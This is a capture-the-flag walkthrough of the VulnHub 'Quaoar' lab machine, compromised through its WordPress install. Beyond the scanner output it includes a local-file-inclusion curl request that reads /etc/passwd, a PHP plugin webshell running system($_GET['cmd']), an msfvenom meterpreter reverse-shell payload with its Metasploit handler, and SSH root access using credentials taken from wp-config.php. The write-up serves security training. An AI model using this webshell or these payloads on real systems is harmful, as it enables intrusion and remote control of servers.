+++
title = "hackfest2016-Quaroar"
slug = "hackfest-2016-quaroar"
[taxonomies]
categories=["vulnhub"]
tags=["vulnerable-machine"]
+++
# Quaoar

```bash
root@425a6cebc5e3:/# nmap -T4 -A -sC -v -P 0-65535 192.168.171.128 -oA quaoar
Warning: The -P0 option is deprecated. Please use -Pn

Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 05:58 UTC
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:58
Completed Parallel DNS resolution of 1 host. at 05:58, 0.08s elapsed
Initiating SYN Stealth Scan at 05:58
Scanning 192.168.171.128 [1000 ports]
Discovered open port 139/tcp on 192.168.171.128
Discovered open port 445/tcp on 192.168.171.128
Discovered open port 143/tcp on 192.168.171.128
Discovered open port 995/tcp on 192.168.171.128
Discovered open port 993/tcp on 192.168.171.128
Discovered open port 80/tcp on 192.168.171.128
Discovered open port 22/tcp on 192.168.171.128
Discovered open port 53/tcp on 192.168.171.128
Discovered open port 110/tcp on 192.168.171.128
Completed SYN Stealth Scan at 05:58, 0.18s elapsed (1000 total ports)
Initiating Service scan at 05:58
Scanning 9 services on 192.168.171.128
Completed Service scan at 05:58, 11.02s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 192.168.171.128
Retrying OS detection (try #2) against 192.168.171.128
Initiating Traceroute at 05:58
Completed Traceroute at 05:58, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 05:58
Completed Parallel DNS resolution of 2 hosts. at 05:58, 0.08s elapsed
NSE: Script scanning 192.168.171.128.
Initiating NSE at 05:58
Completed NSE at 05:58, 10.65s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Nmap scan report for 192.168.171.128
Host is up (0.00079s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA UIDL STLS SASL TOP RESP-CODES
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:46+00:00; 0s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK LOGIN-REFERRALS LOGINDISABLEDA0001 IDLE capabilities SASL-IR LITERAL+ post-login listed IMAP4rev1 ENABLE have Pre-login ID more STARTTLS
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:46+00:00; 0s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS Pre-login IDLE listed SASL-IR LITERAL+ post-login AUTH=PLAINA0001 IMAP4rev1 ENABLE have capabilities ID more OK
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:45+00:00; 0s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA UIDL USER SASL(PLAIN) TOP RESP-CODES
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:45+00:00; 0s from scanner time.
Device type: general purpose
Running (JUST GUESSING): Apple Mac OS X 10.7.X (85%), FreeBSD 8.X (85%)
OS CPE: cpe:/o:apple:mac_os_x:10.7.4 cpe:/o:freebsd:freebsd:8.0
Aggressive OS guesses: Apple Mac OS X 10.7.4 (Lion) (Darwin 11.4.0) (85%), FreeBSD 8.0-CURRENT (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=136 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   QUAOAR<00>           Flags: <unique><active>
|   QUAOAR<03>           Flags: <unique><active>
|   QUAOAR<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-06-08T01:58:45-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE (using port 256/tcp)
HOP RTT     ADDRESS
1   0.05 ms 172.17.0.1
2   0.94 ms 192.168.171.128

NSE: Script Post-scanning.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.024KB)

```

## dirbuster

The VM mentions using dirbuster, so I fired that up with the default wordlists and let it go.

Looks like there are 2 web apps running:

> Wordpress -- /wordpress
> Lepton CMS 2 -- /upload

## Lepton CMS

I tried lepton first and it seemed like it wasn't exactly working, possibly my VM setup.

## Wordpress

```bash
wpscan --url 10.37.129.6/wordpress --wordlist /usr/share/wordlists/wfuzz/others/common_pass.txt -e --random-agent --proxy 192.168.0.9:8080
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://10.37.129.6/wordpress/
[+] Started: Fri Jun 23 04:48:39 2017

[!] The WordPress 'http://10.37.129.6/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://10.37.129.6/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://10.37.129.6/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://10.37.129.6/wordpress/wp-includes/

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 15 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 3.9.15

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 3.9.15

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8730
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 3.9.16

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https://wpvulndb.com/vulnerabilities/8765
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http://seclists.org/oss-sec/2017/q1/563
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https://wpvulndb.com/vulnerabilities/8766
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https://wpvulndb.com/vulnerabilities/8815
    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https://wpvulndb.com/vulnerabilities/8816
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
    Reference: https://wpvulndb.com/vulnerabilities/8817
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8818
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https://wpvulndb.com/vulnerabilities/8819
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8820
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
[i] Fixed in: 3.9.19

[+] WordPress theme in use: twentyfourteen - v1.1

[+] Name: twentyfourteen - v1.1
 |  Location: http://10.37.129.6/wordpress/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 2.0
 |  Style URL: http://10.37.129.6/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:12 <=====================================================================================================================================================================================> (1523 / 1523) 100.00% Time: 00:00:12

[+] We found 2 plugins:

[+] Name: akismet - v3.0.1
 |  Location: http://10.37.129.6/wordpress/wp-content/plugins/akismet/
 |  Readme: http://10.37.129.6/wordpress/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 3.3.2

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: mail-masta - v1.0
 |  Latest version: 1.0 (up to date)
 |  Location: http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/
 |  Readme: http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/readme.txt
[!] Directory listing is enabled: http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/

[!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
    Reference: https://wpvulndb.com/vulnerabilities/8609
    Reference: https://cxsecurity.com/issue/WLB-2016080220
    Reference: https://www.exploit-db.com/exploits/40290/

[!] Title: Mail Masta 1.0 - Multiple SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8740
    Reference: https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:03 <=======================================================================================================================================================================================> (280 / 280) 100.00% Time: 00:00:03

[+] No themes found

[+] Enumerating timthumb files ...

   Time: 00:00:27 <=====================================================================================================================================================================================> (2541 / 2541) 100.00% Time: 00:00:27

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username 'admin' is still used
[+] Starting the password brute forcer
  [!] ERROR: We received an unknown response for admin...
  Brute Forcing 'admin' Time: 00:00:02 <====================================================================================================================================================================> (52 / 52) 100.00% Time: 00:00:02

  Brute Forcing 'wpuser' Time: 00:00:02 <===================================================================================================================================================================> (52 / 52) 100.00% Time: 00:00:02


  +----+--------+--------+----------+
  | Id | Login  | Name   | Password |
  +----+--------+--------+----------+
  | 1  | admin  | admin  |          |
  | 2  | wpuser | wpuser |          |
  +----+--------+--------+----------+

[+] Finished: Fri Jun 23 04:49:31 2017
[+] Requests Done: 4523
[+] Memory used: 168.398 MB
[+] Elapsed time: 00:00:52
```

Try logging in as admin:admin, works

```bash
curl -v http://10.37.129.6/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
*   Trying 10.37.129.6...
* TCP_NODELAY set
* Connected to 10.37.129.6 (10.37.129.6) port 80 (#0)
> GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd HTTP/1.1
> Host: 10.37.129.6
> User-Agent: curl/7.51.0
> Accept: */*
>
* HTTP 1.0, assume close after body
< HTTP/1.0 500 Internal Server Error
< Date: Sat, 10 Jun 2017 03:27:17 GMT
< Server: Apache/2.2.22 (Ubuntu)
< X-Powered-By: PHP/5.3.10-1ubuntu3
< Vary: Accept-Encoding
< Content-Length: 1745
< Connection: close
< Content-Type: text/html
<
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
colord:x:104:109:colord colour management daemon,,,:/var/lib/colord:/bin/false
whoopsie:x:105:112::/nonexistent:/bin/false
avahi:x:106:115:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
bind:x:107:117::/var/cache/bind:/bin/false
postfix:x:108:118::/var/spool/postfix:/bin/false
dovecot:x:109:120:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:110:65534:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:111:121::/var/lib/landscape:/bin/false
libvirt-qemu:x:112:106:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:113:123:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
sshd:x:114:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
tomcat6:x:116:126::/usr/share/tomcat6:/bin/false
wpadmin:x:1001:1001::/home/wpadmin:/bin/sh
```

Still no way to get a password.

Next I realized as an administrator I can install plugins.  So I made a simple webshell:

```php
<?php
/*
 * Plugin Name: backdoor
 * Plugin URI: https://www.com
 * Description: backdoor
 * Version: 1.0.0
 * Author: backdoor
 * Author URI: http://www.com
 * Text Domain: backdoor
 * Domain Path: /languages
 * */

echo system($_GET["cmd"]); 
?>
```

Once actived I was able to execute code. Now for a meterpreter payload and serve it up with SimpleHTTPServer

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=111.111.111.111 LPORT=444 R > backdoor.php
pythom -m SimpleHTTPServer
```

Then I can use my plugin to get the payload onto the web server and start metasploit:

```bash
msfconsole
use exploit/multi/handler
set LHOST 111.111.111.111
set LPORT 4444
set payload php/meterpreter/reverse_tcp
exploit
```

Now that the meterpreter handler is running I can fire up the shell and now we have the first flag.

## PrivEsc

Now that I have shell:

```bash
cat /home/wpadmin/flag.txt
```

```bash
cd ../../../../
pwd
/var/www/wordpress
```

Now that we are in the Wordpress root let's look at the config file and see what the database credentials are:

```bash
cat wp-config.php
```

```php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
```

Now to test:

```bash
ssh root@vm
pass: rootpassword!
```

And we're in, do a quick ls and see the flag:

```bash
cat /root/flag.txt
```

Lastly:

```bash
cat /etc/cron.d/php5
```
